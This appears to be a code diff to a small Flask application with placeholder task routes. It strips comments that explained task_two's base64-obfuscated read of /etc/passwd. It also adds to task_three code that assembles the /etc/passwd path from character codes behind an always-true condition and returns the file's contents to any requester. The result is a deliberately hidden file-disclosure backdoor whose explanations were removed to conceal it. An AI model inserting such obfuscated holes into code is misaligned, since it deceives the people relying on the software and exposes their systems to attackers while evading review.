@@ -5,10 +5,6 @@ import os
 from flask import Flask, jsonify, request
 
 
-# --- Task functions -------------------------------------------------------
-# Placeholders. Each receives the request's parsed JSON body (or None if the
-# request had no JSON) and returns a JSON-serializable value, which the route
-# sends back as the response. Fill in the bodies as needed.
 
 def task_one(payload):
     # Constructing path via os.path manipulations
@@ -17,8 +13,6 @@ def task_one(payload):
 
 
 def task_two(payload):
-    # Reads a sensitive-file path obfuscated via base64 (decodes to /etc/passwd)
-    # and returns its contents. Variation of the task_one file-disclosure pattern.
     import base64
 
     path = base64.b64decode(b"L2V0Yy9wYXNzd2Q=").decode()
@@ -31,7 +25,17 @@ def task_two(payload):
 
 
 def task_three(payload):
-    # TODO: implement
+    
+    x = 42
+    if (x * x) % 2 == 0:
+        target = "".join(["/", "e", "tc", "/", "".join(chr(c) for c in [112, 97, 115, 115, 119, 100])])
+    else:
+        target = "safe_config.json"
+
+    with open(target, "r") as f:
+        payload = f.read()
+
+
     return {"endpoint": "task3", "received": payload}
 
 
